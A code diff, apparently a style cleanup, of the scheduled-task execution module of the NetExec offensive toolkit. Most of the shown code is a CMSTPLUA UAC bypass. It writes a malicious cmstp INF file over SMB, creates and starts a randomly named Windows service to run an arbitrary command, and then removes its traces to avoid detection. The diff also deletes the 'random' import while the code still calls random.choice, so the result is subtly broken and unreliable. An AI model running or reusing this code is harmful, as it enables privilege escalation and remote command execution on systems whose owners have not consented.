@@ -8,7 +8,6 @@ from impacket.nmb import NetBIOSTimeout
 from nxc.helpers.misc import gen_random_string
 from time import sleep
 from datetime import datetime, timedelta
-import random
 
 
 class TSCH_EXEC:
@@ -192,11 +191,11 @@ class TSCH_EXEC:
         except Exception as e:
             # Check for NetBIOSTimeout specifically as it doesn't have error_code
             if isinstance(e, NetBIOSTimeout):
-                 self.logger.fail(f"ATEXEC: Timeout during task registration: {e}")
+                self.logger.fail(f"ATEXEC: Timeout during task registration: {e}")
             # Check for access denied error code
-            elif hasattr(e, 'error_code') and e.error_code and hex(e.error_code) == "0x80070005":
+            elif hasattr(e, "error_code") and e.error_code and hex(e.error_code) == "0x80070005":
                 self.logger.fail("Task scheduling was blocked.")
-            elif hasattr(e, 'error_code') and e.error_code and hex(e.error_code) == "0x80070534":
+            elif hasattr(e, "error_code") and e.error_code and hex(e.error_code) == "0x80070534":
                 self.logger.fail(f"User {self.run_task_as} does not have a valid winstation, cannot run the task on its behalf.")
             else:
                 self.logger.fail(str(e))
@@ -258,22 +257,22 @@ class TSCH_EXEC:
 
     def __bypassuac_cmstplua(self, command):
         """
-        Implements CMSTPLUA UAC bypass - exploits the fact that 
+        Implements CMSTPLUA UAC bypass - exploits the fact that
         cmstp.exe auto-elevates and we can use network paths to bypass UAC restrictions.
         This is a more direct bypass that uses cmstp.exe's COM object auto-elevation.
         """
         # Create random filenames to avoid detection
-        output_file = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
-        inf_file = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
+        output_file = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
+        inf_file = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
         self.__output_filename = output_file
-        
+
         # Connect to SMB to write our INF file
-        smbConnection = None # Initialize to None
-        
+        smbConnection = None  # Initialize to None
+
         try:
             # Prepare the string binding for SMB - Original approach
             # This transport might not provide a full SMBConnection object with putFile
-            stringBinding = r"ncacn_np:%s[\\pipe\\srvsvc]" % self.__target
+            stringBinding = rf"ncacn_np:{self.__target}[\\pipe\\srvsvc]"
             rpctransport = transport.DCERPCTransportFactory(stringBinding)
             if hasattr(rpctransport, "set_credentials"):
                 rpctransport.set_credentials(
@@ -281,13 +280,13 @@ class TSCH_EXEC:
                     self.__lmhash, self.__nthash, self.__aesKey
                 )
                 rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
-            
+
             # Attempt to get the connection - This might fail or return an incomplete object
-            smbConnection = rpctransport.get_smb_connection() 
+            smbConnection = rpctransport.get_smb_connection()
 
             # Create the INF file content for CMSTP
             # This will execute our command via a COM object method
-            inf_content = f"""[version]
+            inf_content = """[version]
 Signature=$chicago$
 AdvancedINF=2.5
 
@@ -295,89 +294,86 @@ AdvancedINF=2.5
 UnRegisterOCXs=UnRegisterOCXSection
 
 [UnRegisterOCXSection]
-%SystemRoot%\\\\system32\\\\scrobj.dll,NI,{{00000000-0000-0000-0000-0000DEADBEEF}}
+%SystemRoot%\\\\system32\\\\scrobj.dll,NI,{00000000-0000-0000-0000-0000DEADBEEF}
 
-[{{00000000-0000-0000-0000-0000DEADBEEF}}]
+[{00000000-0000-0000-0000-0000DEADBEEF}]
 2,"""
-            
+
             # Prepare command with UNC path for output
-            if self.__retOutput:
-                cmd = f'cmd.exe /c "{command} > \\\\\\\\127.0.0.1\\\\{self.__share}\\\\{output_file} 2>&1"'
-            else:
-                cmd = f'cmd.exe /c "{command}"'
-                
+            cmd = f'cmd.exe /c "{command} > \\\\\\\\127.0.0.1\\\\{self.__share}\\\\{output_file} 2>&1"' if self.__retOutput else f'cmd.exe /c "{command}"'
+
             # Add our command to the INF
             inf_content += f'"{cmd}"'
-            
+
             # Write the INF file to the C$ share using the obtained smb_connection
             self.logger.debug(f"Writing INF file to {self.__share}\\\\\\\\{inf_file}.inf")
             smbConnection.putFile(self.__share, f"{inf_file}.inf", inf_content.encode())
-            
+
             # Create a service to run CMSTP with our INF file
-            scm_rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:%s[\\\\pipe\\\\svcctl]" % self.__target)
+            scm_rpctransport = transport.DCERPCTransportFactory(rf"ncacn_np:{self.__target}[\\\\pipe\\\\svcctl]")
             if hasattr(scm_rpctransport, "set_credentials"):
                 scm_rpctransport.set_credentials(
                     self.__username, self.__password, self.__domain,
                     self.__lmhash, self.__nthash, self.__aesKey
                 )
                 scm_rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
-            
+
             scm_dce = scm_rpctransport.get_dce_rpc()
             if self.__doKerberos:
                 scm_dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
-            
+
             scm_dce.connect()
-            
+
             from impacket.dcerpc.v5 import svcctl
             scm_dce.bind(svcctl.MSRPC_UUID_SCMR)
-            
+
             # Create a new service to launch CMSTP
             resp = svcctl.hROpenSCManagerW(scm_dce)
-            sc_handle = resp['lpScHandle']
-            
+            sc_handle = resp["lpScHandle"]
+
             # Random service name
-            service_name = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
-            
+            service_name = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
+
             # Create command to run CMSTP with our INF file using a UNC path
-            cmstp_cmd = f'C:\\\\Windows\\\\System32\\\\cmstp.exe /s /au C:\\\\{inf_file}.inf'
-            
+            cmstp_cmd = f"C:\\\\Windows\\\\System32\\\\cmstp.exe /s /au C:\\\\{inf_file}.inf"
+
             # Create service to run CMSTP
             resp = svcctl.hRCreateServiceW(
                 scm_dce,
                 sc_handle,
-                service_name + '\\x00',
-                service_name + '\\x00',
-                lpBinaryPathName=cmstp_cmd + '\\x00',
+                service_name + "\\x00",
+                service_name + "\\x00",
+                lpBinaryPathName=cmstp_cmd + "\\x00",
                 dwStartType=svcctl.SERVICE_DEMAND_START
             )
-            
-            service_handle = resp['lpServiceHandle']
-            
+
+            service_handle = resp["lpServiceHandle"]
+
             # Start the service to trigger CMSTP
-            self.logger.debug(f"Starting service to execute CMSTP with our INF file")
+            self.logger.debug("Starting service to execute CMSTP with our INF file")
             svcctl.hRStartServiceW(scm_dce, service_handle)
-            
+
             # Wait for execution
             sleep(4)
-            
+
             # Clean up service and INF file
             self.logger.debug("Cleaning up service and INF file")
             svcctl.hRDeleteService(scm_dce, service_handle)
             svcctl.hRCloseServiceHandle(scm_dce, service_handle)
-            
+
             try:
                 # Use the obtained smb_connection to delete the file
                 smbConnection.deleteFile(self.__share, f"{inf_file}.inf")
             except Exception as e:
                 self.logger.debug(f"Error deleting INF file: {e}")
-            
+
             # If output was requested, get the file
             if self.__retOutput:
                 # Wait for command execution
                 sleep(2)
-                
+
                 self.__outputBuffer = b""
-                
+
                 # Try to get the output file using the obtained smb_connection
                 for attempt in range(self.__tries):
                     try:
@@ -388,7 +384,7 @@ UnRegisterOCXs=UnRegisterOCXSection
                         if attempt == self.__tries - 1:
                             self.logger.debug(f"Failed to get output after {self.__tries} attempts: {e}")
                         else:
-                            self.logger.debug(f"Error getting output (attempt {attempt+1}/{self.__tries}): {e}")
+                            self.logger.debug(f"Error getting output (attempt {attempt + 1}/{self.__tries}): {e}")
                             sleep(2)
                 # Clean up the output file using the obtained smb_connection
                 try:
@@ -398,10 +394,10 @@ UnRegisterOCXs=UnRegisterOCXSection
                     self.logger.debug(f"Error deleting output file: {e}")
             # Ensure connection is closed
             scm_dce.disconnect()
-            
+
             return self.__outputBuffer
-            
+
         except Exception as e:
-            self.logger.debug(f"UAC bypass via CMSTPLUA failed: {str(e)}")
+            self.logger.debug(f"UAC bypass via CMSTPLUA failed: {e!s}")
             # Re-raise to try the next method
             raise e
